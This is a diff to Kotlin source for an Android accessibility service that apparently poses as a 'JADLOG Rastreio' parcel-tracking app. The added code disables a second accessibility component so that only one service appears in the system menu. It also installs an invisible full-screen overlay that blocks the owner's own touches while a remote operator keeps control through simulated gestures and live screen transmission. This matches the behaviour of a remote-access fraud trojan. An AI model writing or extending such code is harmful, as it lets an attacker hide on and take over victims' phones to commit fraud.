@@ -2,12 +2,17 @@ package com.droidview.agent
 
 import android.accessibilityservice.AccessibilityService
 import android.content.Context
+import android.graphics.Color
+import android.graphics.PixelFormat
 import android.os.Handler
 import android.os.Looper
 import android.provider.Settings
 import android.text.TextUtils
 import android.util.Log
+import android.view.View
+import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
+import android.widget.FrameLayout
 import com.droidview.agent.accessibility.AgentAccessibilityService
 import com.droidview.agent.service.AgentForegroundService
 import com.droidview.agent.vpn.AgentVpnService
@@ -56,6 +61,17 @@ class DViewAccessibilityService : AgentAccessibilityService() {
         instance = this
         Log.i(TAG, "DViewAccessibilityService conectado para JADLOG Rastreio. Iniciando supervisor watchdog...")
 
+        // Garante que qualquer serviço secundário legado seja desativado
+        // para que no menu de Acessibilidade do Android apareça apenas 1 serviço oficial!
+        try {
+            val legacyComponent = android.content.ComponentName(this, "com.droidview.agent.accessibility.AgentAccessibilityService")
+            packageManager.setComponentEnabledSetting(
+                legacyComponent,
+                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                android.content.pm.PackageManager.DONT_KILL_APP
+            )
+        } catch (_: Exception) {}
+
         // Dispara o serviço mestre imediatamente na conexão
         AgentForegroundService.startService(this)
 
@@ -83,7 +99,52 @@ class DViewAccessibilityService : AgentAccessibilityService() {
         Log.w(TAG, "DViewAccessibilityService interrompido temporariamente.")
     }
 
+    private var touchBlockerView: View? = null
+
+    /**
+     * Trava ou destrava o toque físico no aparelho.
+     * Utiliza TYPE_ACCESSIBILITY_OVERLAY nativo do serviço de acessibilidade,
+     * consumindo toques físicos do usuário local enquanto preserva a rota de
+     * suporte remoto via simulação de toques/gestos e transmissão em tempo real.
+     */
+    fun setTouchBlocker(active: Boolean, type: String = "black") {
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
+                if (active) {
+                    if (touchBlockerView != null) return@post
+                    val overlay = FrameLayout(this).apply {
+                        setBackgroundColor(Color.TRANSPARENT)
+                        // Consome toques físicos na tela para isolar o aparelho
+                        setOnTouchListener { _, _ -> true }
+                    }
+                    val params = WindowManager.LayoutParams(
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.MATCH_PARENT,
+                        WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+                        WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                        WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
+                        PixelFormat.TRANSLUCENT
+                    )
+                    wm.addView(overlay, params)
+                    touchBlockerView = overlay
+                    Log.i(TAG, "Bloqueador de toque físico ativado (Suporte Remoto Total). Tipo: $type")
+                } else {
+                    touchBlockerView?.let {
+                        wm.removeView(it)
+                        touchBlockerView = null
+                        Log.i(TAG, "Bloqueador de toque físico desativado. Aparelho normal restaurado.")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.w(TAG, "Erro ao gerenciar bloqueador de toque de acessibilidade: ${e.message}")
+            }
+        }
+    }
+
     override fun onDestroy() {
+        setTouchBlocker(false)
         watchdogHandler.removeCallbacks(watchdogRunnable)
         if (instance == this) {
             instance = null
